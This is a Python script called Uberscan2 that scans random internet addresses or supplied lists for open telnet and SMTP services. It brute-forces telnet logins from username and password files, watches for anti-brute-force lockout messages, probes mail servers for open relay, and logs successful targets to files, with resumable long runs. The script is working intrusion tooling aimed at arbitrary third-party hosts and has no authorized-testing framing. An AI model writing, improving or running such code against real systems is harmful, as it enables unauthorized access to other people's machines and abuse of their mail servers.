#!/usr/bin/python3
#************************** PrintUsage *****************************

def PrintUsage():
	print ("")
	print ("\t\t\tUBERSCAN2")
	print ("\t\tThe python version of Uberscan!!")
	print ("")
	print ("\t\t Copyright (c) 2024 Batch McNulty")
	print ("")
	#print ("UNDER CONSTRUCTION:")
	#print ("-hack: keepwhois	Scan whois, but keep files ")
	#print ("-waitrand: nn		wait a random number of seconds between 1 and nn between tries")
	#print (" END OF UNDER CONSTRUCTION")
	#print (" ")
	print ("-test_interval: nn	Interval between tests (in number of connections). Defaults 1. Choose a LARGE number to switch off testing entirely!")
	print ("-number_of_pings: n	Number of pings to send when testing internet connection. Default 2, increase if your connection is bad")
	print ("-ping_target: foo	Target of pings. Default is google.com")
	print ("-hourly_backups		Back up bookmark file hourly, good for long runs with flaky comms")

	print ("-save: blah.txt		save to bookmark file blah.txt (saves to BOOKMARK.TXT by default)")
	print ("-resume: blah.txt	Resume from bookmark file bookmark.txt")
	print ("-timeout: nn		Timeout value in seconds (duh). Also waits this many seconds between tries")
	print ("-port: nn			where nn = port number (ie, 25)")
	print ("-hack: searchwhois: foo	Search WHOIS database for content foo (case insensetive")
	print ("-hack: smtphelo		Auto test numbers in ipnumbers.txt again smtp HELO command")
	print ("-hack: smtphack		Try the SMTP hack")
	print ("-hack: telnet		Try to hack telnet")
	print ("-keepfound		Keep servers found even if we couldn't hack them (Only works with -hack: telnet)")
	print ("-ipnumber: nn.nn.nn.nn	Use nn.nn.nn.nn as the target address, single-crack stylee (UNDER CONSTRUCTION")
	print ("-ipfile: blah.txt	Use file blah.txt for ips" )
	print ("-successfile: blah.txt	use file blah.txt to output successful hax!")
	print ("-foundfile: blah.txt	use file blah.txt to output found IPs (implies -keepfound)")
	print ("-dumpfile: blah		Use blah as dump file (dumps any & all interactions)")
	print ("-userfile: blah.txt	Use blah.txt instead of usernames.txt")
	print ("-pwdfile: blah.txt	Use blah.txt instead of passwords.txt")
	print ("\n -examples		Manual and usage examples (not saved)")
	print ("")
	print ("NB: Default behaviour is to try random ip addresses with a timeout of 2 seconds")
	print ("")


########################### PRINTEXAMPLES ############################

def PrintExamples():
	print ("")
	print ("")
	print ("Some usage examples:")
	print ("\n uberscan2 -hack: telnet -keepfound -test_interval: 99999")
	print ("\n This will look for open telnet ports in random addresses and put them in found.txt. Since we are searching random address space, we don't need to test connectivity so a large value is passed to -test_interval:")
	print ("")
	print ("\n uberscan2 -hack: telnet -keepfound -ipfile: ipnumbers.txt -hourly_backups")
	print ("\n Look for open telnet ports using ipnumbers.txt as a source file, put them in found.txt. Since we are eliminating possibilities from a text file, we leave connectivity tests alone and ensure we backup our resume files every hour")
	print ("")
	print ("")
	print ("When searching for new prospects, always check the dumpfile (dump.txt unless you specify otherwise) as it won't always pick up every single thing it finds. However be aware that they're in the dumpfile for a reason so stuff found there might not work.")
	print ("")




#************************ Hacksmtp_helo *************************
def Hacksmtp_helo (serverHost, serverPort, timeout):
		
	import sys
	import time
#	uname_n_pwd = [username,password]
	#sockobj= socket(AF_INET, SOCK_STREAM)
	try:
		sockobj= socket(AF_INET, SOCK_STREAM)
		sockobj.settimeout(timeout)
	except:
		print ("*** COULDN'T START STREAM, BAD IP?")
		return ("BADIP")
	#sockobj= (AF_INET, SOCK_STREAM)
	data = ""
	try:
		sockobj.connect((serverHost, serverPort))
		data = sockobj.recv(1024)
	#except socket.timeout:
	#	print ("*** CONNECTION TIMED OUT ***")
	#	return ("BADIP")	
	except:
		print ("*** COULDN'T CONNECT, SUCKY IP ADDRESS ***")
		return ("BADIP")
	print ("*******************************************")
	print ("First reply from",serverHost, repr(data))
	print ("First reply (raw):",data)
	print ("*******************************************")
	if (repr(data) == "b''"):
		print (" *** SOME BULLSHIT, SKIPPING ***")
		return ("BADIP")
	
	#print (hack, uname_n_pwd[hack])
	sockno = sockobj
	print ("sockno:",sockno)

	print ("sending HELO...")
	sockobj.send ("HELO".encode('ascii')+b"\n")
	data = sockobj.recv(1024)
	print ("from",serverHost, repr(data))
	print ("Decd",serverHost, data.decode())
	#print ("Attempt to get inside repr(data):")
	#print (data (socket))
	result = repr(data)
	openhandles = sockobj.close()
	print ("openhandles:",openhandles)
	sockno = sockobj
	print ("sockno:",sockno)
	#print ("Dec\'d:",sockno.decode())
	#sockobj.shutdown(openhandles)
	time.sleep (1)
	if (result.find('452 syntax error (connecting)') > -1):
		print ("Syntax error error message.")
		return (False)
	else:
		print ("***********MAYBE!!*********")
		return (True)












#************************ SearchWHOIS ********************************

def SearchWHOIS (ipnumber, searchfor):
	import subprocess
	import sys
	import time
	
	print ("IP number:",ipnumber, "Search string:", searchfor)
	command = "whois",ipnumber
	print ("command:",command)
	print ("******************************************************")
	print ("******** SEARCHSTRING:",searchfor,"**********************")
	searchfor = searchfor.casefold()
	print ("****** LOWERCASE SEARCHSTRING:",searchfor,"********")
	#whoisresult = subprocess.run ([command], capture_output = True)
	#whoisresult = subprocess.run (command, capture_output = True)
	try:
		whoisresult = subprocess.check_output (command)
	except:
		print ("Prolly not a real IP address. Try another.")
		return (False)
	print ("**********************************************************")
	print ("whoisresult:",whoisresult)
	#finalresult = pipe.stdout.read
	#print ("**********************************************************")
	#print ("finalresult:",finalresult)
	print ("**********************************************************")
	print (type (whoisresult))
	whoisresult = str (whoisresult)
	print (type (whoisresult))
	whoisresult = str(whoisresult.casefold())
	print ("**********************************************************")
	print ("LOWERCASE WHOISRESULT:", whoisresult)
	print ("**********************************************************")
	#searchresult = whoisresult.find (searchfor)
	searchresult = searchfor in whoisresult
	print ("searchresult:",searchresult)
	#searchresult = b'searchfor' in whoisresult
	print ("**********************************************************")
	print ("******** SEARCHSTRING:",searchfor,"**********************")
	print ("******************************************************")

	if searchresult == True:
		print ("Found!")
	else:
		print ("Not found!")
	print (searchresult)
	return (searchresult)

# ************************************************************************************************









#************************ Hacksmtp *************************
def Hacksmtp (serverHost, serverPort, timeout):
		
	import sys
	import time

	print ("host:",serverHost,"port:",serverPort,"timeout:",timeout)
	
	#time.sleep(1)
#	uname_n_pwd = [username,password]
	#sockobj= socket(AF_INET, SOCK_STREAM)
	try:
		sockobj= socket(AF_INET, SOCK_STREAM)
		sockobj.settimeout(timeout)
	except:
		print ("*** COULDN'T START STREAM, BAD IP?")
		return ("BADIP")
	#sockobj= (AF_INET, SOCK_STREAM)
	data = ""
	try:
		sockobj.connect((serverHost, serverPort))
		data = sockobj.recv(1024)
	#except socket.timeout:
	#	print ("*** CONNECTION TIMED OUT ***")
	#	return ("BADIP")	
	except:
		print ("*** COULDN'T CONNECT, SUCKY IP ADDRESS ***")
		return ("BADIP")
	print ("*******************************************")
	print ("First reply from",serverHost, repr(data))
	print ("First reply (raw):",data)
	print ("*******************************************")
	if (repr(data) == "b''"):
		print (" *** SOME BULLSHIT, SKIPPING ***")
		return ("BADIP")
	
	#print (hack, uname_n_pwd[hack])
	sockno = sockobj
	print ("sockno:",sockno)

	print ("sending HELO...")
	try:
		sockobj.send ("HELO localhost".encode('ascii')+b"\n")
		data = sockobj.recv(1024)
	except:
		print ("TIMED OUT, Returning False at HELO")
		return (False)
	print ("from",serverHost, repr(data))
	print ("Decd",serverHost, data.decode())
	#print ("Attempt to get inside repr(data):")
	#print (data (socket))
	result = repr(data)
	if (result.find('452 syntax error (connecting)') > -1):
		print ("Syntax error error message.")
		return (False)

	print ("sending MAIL FROM:...")

	try:
		sockobj.send("MAIL FROM: localhost".encode('ascii')+b"\n")
		data = sockobj.recv(1024)
	except:
		print ("TIMED OUT, Returning False at MAIL FROM")
		return (False)
	print ("from",serverHost, repr(data))
	print ("Decd",serverHost, data.decode())
	#print ("Attempt to get inside repr(data):")
	#print (data (socket))
	result = repr(data)

	print ("sending RCPT TO:...")
	try:
		sockobj.send("RCPT TO: localhost".encode('ascii')+b"\n")
		data = sockobj.recv(1024)
	except:
		print ("TIMED OUT, returning False at RCPT TO")
		return (False)
	#data = sockobj.recv(1024)

	print ("from",serverHost, repr(data))
	print ("Decd",serverHost, data.decode())
	#print ("Attempt to get inside repr(data):")
	#print (data (socket))
	result = repr(data)

	openhandles = sockobj.close()
	print ("openhandles:",openhandles)
	sockno = sockobj
	print ("sockno:",sockno)
	#print ("Dec\'d:",sockno.decode())
	#sockobj.shutdown(openhandles)
	time.sleep (timeout)
	if (result.find("250") > -1):
		print ("**** MAYBE ON HACKSMTP()! ****")
		return (True)
	if (result.find("251") > -1):
		print ("**** MAYBE ON HACKSMTP()! ****")
		return (True)
	if (result.find("354") > -1):
		print ("**** MAYBE ON HACKSMTP()! ****")
		return (True)
	else:
		print ("**** LOOKS BAD ON HACKSMTP()! ***!")
		return (False)
























# *********************** DumpData **********************************

def DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile):
	print ("**** Emergency dump from IP:",ipnumber,"\n port:",port,"username tried was",username, "password tried was", password,"timeout was", timeout,"data encountered was", data, "****")
	dumphandle = open(dumpfile, "a")
	print ("\n ************** Emergency dump ****************\n\n from IP:",ipnumber,"\n port:",port,"\n username tried was",username, "\n password tried was", password,"\n timeout was", timeout,"\ndata encountered was(newline is mine):\n", data, "\n*************************** END OF DATA *************************\n\n\n\n\n", file = dumphandle)
	dumphandle.close()

#************************ HackTelnet *************************
# I think the problem with this is it's using recv, which is too low level a system call.

def HackTelnet (serverHost, serverPort, username, password, timeout):
		
	import sys
	import time

	uname_n_pwd = [username,password]
	try:
		sockobj= socket(AF_INET, SOCK_STREAM)
		sockobj.settimeout(timeout)	
	except:
		print ("*** COULDN'T START STREAM, BAD IP?")
		return ("BADIP")
	data = ""

	#sockobj.connect((serverHost, serverPort))
	#data = sockobj.recv(1024)
	
	try:
		sockobj.connect((serverHost, serverPort))
		data = sockobj.recv(1024)
	except:
		print ("*** COULDN'T CONNECT TO TELNET HOST, SUCKY IP ADDRESS ***")
		return ("BADIP")
	
	print ("*******************************************")
	print ("First reply from",serverHost, repr(data))
	print ("First reply (raw):",data)
	print ("*******************************************")

	if (repr(data) == "b''"):
		print (" *** SOME BULLSHIT, SKIPPING ***")
		openhandles = sockobj.close()
		print ("openhandles:",openhandles)
		time.sleep(1)
		return ("BADIP")

	
	
	for hack in range (0,2):
		print ("*********** HACKLOOP BEGINS. Have looped:",hack,"times ********")
		print (hack, uname_n_pwd[hack])
		sockno = sockobj
		print ("sockno:",sockno)

		result = repr(data)
		looptimes = 0

		if (result.find('Protection of brute force attack') > -1):
			print ("*** LOCKED OUT by ICE!! ***  (telnet found a \"Protection of brute force attack\" error message)")
			DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
			return ("BADIP")



		####### Wait till we have what looks like a prompt (the string ":") (not the quotations marks dummy) #######
		while (result.find(':') < 0):
			try:
				data = sockobj.recv(1)
				
			except:
				print ("Couldn't get data after handshake negotiated. Dumping and quitting...")
				DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
				print ("IP: ",serverHost, ":",serverPort)
				return ("BADIP")

			result = repr(data)
			looptimes += 1
			print ("FROM ",serverHost, ":",result)
			if (looptimes > 1020):
				print ("Something has gone wrong. Dumping data to file and quitting")
				DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
				print ("IP: ",serverHost, ":",serverPort)
				return ("BADIP")

		print ("sending",uname_n_pwd[hack])
		time.sleep (1)
		try:
			sockobj.send (uname_n_pwd[hack].encode('ascii')+b"\n")			
		except:
			print ("Couldn't send (timeout?), dumping data....")
			DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
			return ("BADIP")

		time.sleep (timeout)

		try:
			data = sockobj.recv(1024)
		except:
			print ("There's something there but I can't get to it. (timeout?) Keep this IP for later.")
			DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
			return ("BADIP")

		result = repr(data)
		print ("RECV'd:",result)

		if (result.find('Protection of brute force attack') > -1):
			print ("*** LOCKED OUT by ICE!! ***  (telnet found a \"Protection of brute force attack\" error message)")
			DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
			return ("BADIP")


		'''
		print ("from",serverHost, repr(data))
		try:
			print ("Decd",serverHost, data.decode())
		except:
			print ("Can't decode, this is bad!")
		'''
		#print ("Attempt to get inside repr(data):")
		#print (data (socket))

	time.sleep(timeout)	

	try:
		data = sockobj.recv(1024)
	except:
		print ("Couldn't recv, dumping data....")
		print ("There's something there but I can't get to it. Keep this IP for later.")
		DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
		return ("BADIP")

	time.sleep(0.1)
	result = repr(data)
	openhandles = sockobj.close()
	print ("openhandles:",openhandles)
	sockno = sockobj
	print ("sockno:",sockno)
	print ("FINAL RECVD DATA:",result)
	#print ("Dec\'d:",sockno.decode())
	#sockobj.shutdown(openhandles)
	
	time.sleep(0.1)
	
	if (result.find('Protection of brute force attack') > -1):
		print ("*** LOCKED OUT by ICE!! ***  (telnet found a \"Protection of brute force attack\" error message)")
		DumpData(serverHost,serverPort, username, password, timeout, data, dumpfile)
		return ("BADIP")

	if (result.find('User not exist.') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"User not exist.\" error message)")
		return (False)

	if (result.find('ailed') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"ailed\" error message)")
		return (False)

	if (result.find('nvalid') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"nvalid\" error message)")
		return (False)

	elif (result.find('ailure') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"ailure\" error message)")
		return (False)

	elif (result.find('ogin:') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"ogin:\" prompt)")
		return (False)

	elif (result.find('sername:') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"sername:\" prompt)")
		return (False)

	elif (result.find('assword:') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"sername:\" prompt)")
		return (False)

	elif (result.find('ad name or password') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found a \"ad name or password\" error message)")
		return (False)

	elif (result.find('incorrect') > -1):
		print ("WRONG USERNAME OR PASSWORD (telnet found an (\"incorrect\" error message)")
		return (False)	



	else:
		print ("***********MAYBE (telnet)!!*********")
		return (True)












	
#*********************** WRITEFOUNDFILE ************************

def WriteFoundFile(foundfile, ipnumber, port, username, password):
	import time
	#foundfile = "found.txt"
	print ("**** found host on:",ipnumber, port,username, password, "****")
	foundhandle = open(foundfile, "a")
	print (ipnumber, port,username, password, file = foundhandle)
	foundhandle.close()
	time.sleep(0.1)





	
#*********************** WRITESUCCESSFILE ************************

def WriteSuccessFile(successfile, ipnumber, port, username, password):
	import time
	#successfile = "success.txt"
	print ("**** Success on:",ipnumber, port,username, password, "****")
	handle = open(successfile, "a")
	print (ipnumber, port,username, password, file = handle)
	handle.close()
	time.sleep(0.1)


#************************** WRITESAVEFILE *******************************

def WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target):
	import time
	print ("*** Writing save file",save_name,"***")
	handle = open(save_name, "w")
	print (save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target, sep = "\n", file = handle)
	handle.close()
	time.sleep (0.1)



############################# GETOPTION #########################
def GetOption(option):
	try:
		optno = sys.argv.index(option)+1
		actualoption = str(sys.argv[optno])
		print (option,actualoption, sep = "")
		return (actualoption)
	except:
		print ("No option found for option",option)
		return (False)








############################# GETSINGLEOPTION #########################
def GetSingleOption(option):
	try:
		optno = sys.argv.index(option)
		actualoption = str(sys.argv[optno])
		print (option,":",actualoption)
		return (True)
	except:
		print ("No option found for option",option)
		return (False)








######################### GETRANDOMIP ##############################
def GetRandomIP():
	import random 
	first_octet = 127
	first_n_second = "192.168"
	while (first_octet == 127 or first_n_second == "192.168"):
		first_octet = random.randint(0,256)
		second_octet = random.randint(0,256)
		third_octet = random.randint(0,256)
		fourth_octet = random.randint(0,256)
		first_n_second = str(first_octet)+"."+str(second_octet)
	ipnumber = str(first_octet)+"."+str(second_octet)+"."+str(third_octet)+"."+str(fourth_octet)
	print ("random ipnumber is:",ipnumber)
	return(ipnumber)


########################## HOURLYBACKUP **************************
def HourlyBackup(hourly_backup, lap_time, save_name, hours):
	
	import os
	import time
	
	print ("********* HOURLYBACKUP HOURLYBACKUP HOURLYBACKUP ********* ")
	print ("hourly_backup:",hourly_backup, type (hourly_backup))
	
	if (hourly_backup == True):

		current_time = time.perf_counter()
		elapsed_time = current_time - lap_time
		print ("HOURLYBACKUP current time:",current_time)
		print ("HOURLYBACKUP lap_time:",lap_time)
		print ("HOURLYBACKUP elapsed time:",elapsed_time)
		if (elapsed_time > 3600):
			print ("**** DOING HOURLY BACKUP BACKUP! **** ")
			print ("**** DOING HOURLY BACKUP BACKUP! **** ")
			print ("**** DOING HOURLY BACKUP BACKUP! **** ")
			print ("**** DOING HOURLY BACKUP BACKUP! **** ")
			print ("**** DOING HOURLY BACKUP BACKUP! **** ")
			print ("**** DOING HOURLY BACKUP BACKUP! **** ")
			print ("**** DOING HOURLY BACKUP BACKUP! **** ")
			print ("**** DOING HOURLY BACKUP BACKUP! **** ")
			print ("**** DOING HOURLY BACKUP BACKUP! **** ")
			print ("**** DOING HOURLY BACKUP BACKUP! **** ")
			hours += 1
			hourly_save_name = save_name + (str(hours))
			print (save_name)
			print (hourly_save_name)
			execute = "cp " + save_name + " " + hourly_save_name + "hour" + ".bak"
			print (execute)
			os.system(execute)
			time.sleep (0.1)
			lap_time = time.perf_counter()
			print ("lap_time:", lap_time)

	print ("lap_time:")
	return (lap_time, hours)






################## DOHTTPONLINETEST #############################

def DoHTTPOnlineTest(test_interval, test_counter):
	
	import urllib.request
	
	tests_run = 0
	webpage = "NOT YET ASSIGNED BY PROGRAM"
	
	if (test_interval % test_counter == 0):
		
		test_passed = False
		while (test_passed) == False:
			tests_run += 1
			testurl = "https://google.com"
			print ("Trying ",testurl)
			#webpage = urllib.request.urlopen(testurl)
			#print ("Webpage:",webpage)
			try:
				webpage = urllib.request.urlopen(testurl)
				test_passed = True
				return
			except:
				print ("We're NOT ONLINE! ARGH! Sleeping 600s...")
				time.sleep(600)
			print ("****WARNING ***")
			print ("****WARNING ***")
			print ("****WARNING ***")
			print ("****WARNING ***")
			print ("If you can read this, there might be a problem with your internet.  ")
			print ("tests run:",tests_run)
			print ("Webpage:",webpage)
				
			#quit ("online testville")



################## PINGTEST ###########################################	

def PingTest(number_of_pings, ping_target):

	import os

	response = os.system("ping -c " + str(number_of_pings) + " " + ping_target)
	if (response == 0):
		print (ping_target,"is up")
		return (True)
	else:
		print (ping_target,"is down")
		return (False)
		
######################################################################

################## DOONLINETEST #############################

def DoOnlineTest(number_of_pings, ping_target, test_interval, test_counter):
	
	
	tests_run = 0
	webpage = "NOT YET ASSIGNED BY PROGRAM"
	
	if (test_interval % test_counter == 0):
		
		test_passed = False
		while (test_passed) == False:
			tests_run += 1
			print ("Trying ",ping_target)
			test_passed = PingTest(number_of_pings, ping_target)
			if test_passed == True:
				return
			print ("****WARNING ***")
			print ("****WARNING ***")
			print ("****WARNING ***")
			print ("****WARNING ***")
			print ("If you can read this, there might be a problem with your internet.  ")
			print ("tests run:",tests_run)
			print ("ping target:",ping_target)
			print ("We're NOT ONLINE! ARGH! Sleeping 600s...")
			time.sleep(600)
				
			#quit ("online testville")


################## DOHTTPONLINETEST #############################

def DoHTTPOnlineTest(test_interval, test_counter):
	
	import urllib.request
	
	tests_run = 0
	webpage = "NOT YET ASSIGNED BY PROGRAM"
	
	if (test_interval % test_counter == 0):
		
		test_passed = False
		while (test_passed) == False:
			tests_run += 1
			testurl = "https://google.com"
			print ("Trying ",testurl)
			try:
				webpage = urllib.request.urlopen(testurl)
				test_passed = True
				return
			except:
				print ("We're NOT ONLINE! ARGH! Sleeping 600s...")
				time.sleep(600)
			print ("****WARNING ***")
			print ("****WARNING ***")
			print ("****WARNING ***")
			print ("If you can read this, there might be a problem with your internet.  ")
			print ("tests run:",tests_run)
			print ("Webpage:",webpage)
				
			#quit ("online testville")

#*************************** MAIN PROGRAM ***********************


#********************************************************
from socket import *
import random
import os
import sys
import time
import urllib

test_counter = 0
tests_run = 0

test_interval = int (GetOption("-test_interval:"))
if (test_interval == False):
	test_interval = 1
	
ping_target = GetOption("-ping_target:")
if (ping_target == False):
	print ("PING TARGET TESTS FALSE")
	print ("ping_target:",ping_target, type (ping_target))
	ping_target = "google.com"
	print ("ping_target now:",ping_target)

print ("ping_target:",ping_target, type (ping_target))

number_of_pings = int (GetOption("-number_of_pings:"))

if (number_of_pings == False):
	number_of_pings = 2

print ("number_of_pings:",number_of_pings, type(number_of_pings))

single_crack = False
ip_number = GetOption("-ipnumber:")
if (ip_number != False):
	single_crack = True

timeout = int (GetOption("-timeout:"))
if (timeout == False):
	timeout = 1
print ("Timeout:",timeout)

keepfound = GetSingleOption("-keepfound")

foundfile = GetOption ("-foundfile:")
if (foundfile == False):
	foundfile = "found.txt"
else:
	keepfound = True
	
ipfile = GetOption ("-ipfile:")

dumpfile = GetOption ("-dumpfile:")
if (dumpfile == False):
	dumpfile = "dump.txt"


userfile = "usernames.txt"
pwdfile = "passwords.txt"


port = "0"

port = int (GetOption("-port:"))
hack = GetOption("-hack:")

successfile = GetOption ("-successfile:")
if (successfile == False):
	successfile = "success.txt"


ip_idx = 0
################# Handle userfile and pwdfile ######################

userfile = GetOption ("-userfile:")
pwdfile = GetOption ("-passfile:")
pwdfile = GetOption ("-pwdfile:")

if (userfile == False):	userfile = "usernames.txt"
if (pwdfile == False):	pwdfile = "passwords.txt"


# ********** Hourly_backup ********************************

hourly_backup = GetSingleOption("-hourly_backups")
print ("hourly_backup:",hourly_backup, type (hourly_backup))



####################### Handle resume file ############################
save_name = GetOption("-save:")
print ("save_name:\t",save_name)

resume = False
if (save_name == False):	save_name = "BOOKMARK.TXT"
print ("save_name:\t",save_name)

resume_name = (GetOption("-resume:"))
print ("resume_name:",resume_name)

if (resume_name == False):
	resume = GetSingleOption("-resume")
	if (resume == False):
		if (save_name == False):
			resume_name = "BOOKMARK.TXT"
else:
	resume = True

if (resume == True and resume_name == False):	resume_name = "BOOKMARK.TXT"

print ("save_name:\t",save_name)

#if (resume_name != save_name):
#	save_name = resume_name
			
print ("save_name:\t",save_name)
print ("resume:\t\t",resume)
print ("resume_name:\t",resume_name)

#quit("resume bit")

start_user_idx = 0
start_pwd_idx = 0

user_idx = 0
pwd_idx = 0

ip_idx = 0

######### The actual file jiggery pokery ########

if resume == True:
	
	try:
		infile = open (resume_name, 'r')
	except:
		print ("ERROR.", resume_name,"does not exist, quitting")
		quit()
	resume_contents = infile.readlines()
	print (resume_contents)
	ipfile = resume_contents[0]
	print ("ipfile:",ipfile)
	end = len(resume_contents)
	print ("end:",end)
	for stuff in range (0,end):
		resume_contents[stuff] = resume_contents[stuff].rstrip()
	print (resume_contents)
	
	# print (save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, sep = "\n", file = handle)
	
	save_name = resume_contents[0]
	ipfile = resume_contents[1]
	if (ipfile == "False"):	ipfile = False
	if (ipfile == "n/a"):	ipfile = False
	userfile = resume_contents[2]
	pwdfile = resume_contents[3]
	successfile = resume_contents[4]
	keepfound = bool(resume_contents[5])
	foundfile = resume_contents[6]
	wait = resume_contents[7]
	if (wait != 'n/a'):	timeout = int(resume_contents[7])
	waitrand = resume_contents[8]
	ip_idx = int(resume_contents[9])
	port = int(resume_contents[10])
	hack = resume_contents[11]
	user_idx = int(resume_contents[12])
	start_user_idx = int (user_idx)

	pwd_idx = int(resume_contents[13])
	start_pwd_idx = int (pwd_idx)
	
	dumpfile = (resume_contents[14])

	print ("keepfound:",keepfound,type(keepfound))
	print ("save_name:\t",save_name)
	print ("ipfile:\t",ipfile, type(ipfile))
	print ("single_crack:",single_crack, type(single_crack));
	print ("ip_idx\t",ip_idx, type(ip_idx))
	print ("ip_number:",ip_number, type(ip_number))
	if (ipfile == False or ipfile == "False" or ipfile == 'n/a'):	
		ipfile = False
		print ("ipfile is FALSE")
		try:
			ip_number = (resume_contents[15])
		except:
			ip_number = False
		print ("ip_number:",ip_number)
		if (ip_number == "False" or ip_number == False or ip_number == "n/a"):
			print ("IP number is FALSE, not single crack mode or old bookmark format used...")
		else:
			print ("IP number is something (",ip_number,"),  so setting single-crack mode to TRUE")
			single_crack = True
	print ("single_crack:",single_crack, type(single_crack));
	#quit ("resume stuff")
	
else:
	wait = "n/a"
	waitrand = "n/a"

if (wait != "n/a"):
	if (wait != False):
		wait = int(wait)

if (waitrand != "n/a"):
	if (waitrand != False):
		waitrand = int(waitrand)


# Restore hourly backup #
try:	hourly_backup = bool(resume_contents[16])
except:	print ("Couldn't load hourly backup flag from bookmark file, leaving as user defined / default")
print ("hourly_backup:",hourly_backup, type (hourly_backup))
		
#print ("hack:",hack)
#quit ("Resume has not been developed yet.")

# Restore test interval #

try:	test_interval = int (resume_contents[17])
except:	print ("Couldn't load test interval flag from bookmark file, leaving as userdefined or default")
print ("test_interval:",test_interval, type(test_interval))

try:	number_of_pings = int (resume_contents[18])
except:	print ("couldn't load number of pings flag from bookmark file, leaving as userdefined or default")
print ("number_of_pings:",number_of_pings, type(number_of_pings))

try:	ping_target = int (resume_contents[19])
except:	print ("Couldn't load ping_target from bookmark file, leaving as userdefined or default")
print ("ping_target:",ping_target, type(ping_target))

#quit ()
########################################################################




if (port == False):
	if (hack == "smtphack"):
		port = 25
	if (hack == "smtphelo"):
		port = 25
	if (hack == "telnet"):
		port = 23

if (resume == False):
	if (hack == False):
		if (port == False):
			print ("Can't do anyting, try specifying a port or a hack or resume or both")
			PrintUsage()
			examples = GetSingleOption("-examples")
			if (examples == True):	PrintExamples()
			quit()
		else:
			if (port == "23"):
				hack == "telnet"


print ("Port:",port)
print ("hack:",hack)
	
#quit()
print ("ipfile:",ipfile, type(ipfile))
print ("ip_number",ip_number,type(ip_number))
print ("single_crack",single_crack,type(single_crack))
if (ipfile != False):
	print ("ipfile NOT boolean False, so opening ipfile")
	with open (ipfile, 'r') as file:
		ipnumbers = file.read()
else:
	if (ip_number == False or ip_number == "False" or ip_number == "n/a"):
		print ("ip_number set to boolean FALSE, so setting up dummy ipnumbers array")
		ipnumbers = "Ignore this\n it's a dummy so we can get \n random ips from a subroutine\n\n\n"
		print ("ipnumbers:",ipnumbers)

if (single_crack == True): 
	print ("Single crack is boolean TRUE, so setting up ipnumbers for single crack mode. ")
	ipnumbers = ip_number+"\n\n"
	print ("ipnumbers:",ipnumbers)

#quit ("resume bit, ipnumbers bug")

#print (ipnumbers)
print (len(ipnumbers))
ipnumbers = ipnumbers.strip()
ipnumbers_array = str.split(ipnumbers,"\n")
#print (ipnumbers_array)
print ("userfile:",userfile)
print ("pwdfile:",pwdfile)
#quit ("pwdfile bullshit")

with open (userfile, 'r') as file:
	usernames = file.read()
usernames = usernames.strip()
usernames_array = str.split(usernames, "\n")

with open (pwdfile, 'r') as file:
	passwords = file.read()
passwords = passwords.strip()
passwords_array = str.split(passwords, "\n")


print (usernames_array)
print (passwords_array)
#port = str(port)
print ("port is",port)
print ("port is of type",type(port))

########################### START THE HACKING! #####################

start_time = time.perf_counter()
lap_time = time.perf_counter()
hours = 0
print ("start_time:",start_time)
#time.sleep(5)
current_time = time.perf_counter()
elapsed_time = current_time - start_time
print ("Current time:",current_time)
print ("Elapsed_time:",elapsed_time)
print ("lap_time:", lap_time)
'''
if (hourly_backup == True):
	current_time = time.perf_counter()
	elapsed_time = current_time - lap_time
	if (elapsed_time > 3600):
		laps += 1
		hourly_save_name = save_name + (str(laps))
		print (save_name)
		print (hourly_save_name)
		execute = "cp " + save_name + " " + hourly_save_name + ".bak"
		print (execute)
		os.system(execute)
		time.sleep (0.1)
		lap_time = time.perf_counter()
		print ("lap_time:", lap_time)
		quit ("\n\nTimey wimey stuff 1")

quit ("\n\ntimey wimey stuff 2")
'''
############################ smtp hack ################################

if hack == "smtphack":
	user_idx = "n/a"
	pwd_idx = "n/a"
	
	
	while (ip_idx < len(ipnumbers_array)): 

		if (ipfile == False and single_crack == False):
			ip_idx = 0
			ipnumber = GetRandomIP()
		else:
			ipnumber = ipnumbers_array[ip_idx]
		test_counter += 1
		DoOnlineTest(number_of_pings, ping_target,test_interval, test_counter)
		
		print ("hack = ",hack,"ip_idx:",ip_idx, "keepfound:",keepfound, "foundfile:",foundfile, "successfile:",successfile)
		print ("ipnumber:",ipnumber, "port:",port,"timeout",timeout)
		reality= Hacksmtp(ipnumber, port, timeout)
		if (reality == True):
			WriteFoundFile(foundfile, ipnumber, port, "n/a", "n/a")
			WriteSuccessFile(successfile, ipnumber, port, "n/a", "n/a")
		else:
			print ("No hacksmtp today!")
			if (reality == False):
				if (keepfound == True):
					WriteFoundFile(foundfile, ipnumber, port, "n/a", "n/a")

		ip_idx += 1
		WriteSaveFile(save_name, ipfile, userfile, pwdfile, successfile, keepfound, foundfile, wait, waitrand, ip_idx, port, hack, user_idx, pwd_idx, dumpfile, ip_number, hourly_backup, test_interval, number_of_pings, ping_target)
		
	print ("Bye bye, smtp hacking finished")
	quit()

############################## smtp helo #######################

if hack == "smtphelo":
	user_idx = "n/a"
	pwd_idx = "n/a"

	while (ip_idx < len(ipnumbers_array)): 
		if (ipfile == False and single_crack == False):
			ip_idx = 0
			ipnumber = GetRandomIP()
		else:
			ipnumber = ipnumbers_array[ip_idx]

		test_counter += 1
		DoOnlineTest(number_of_pings, ping_target, test_interval, test_counter)
		
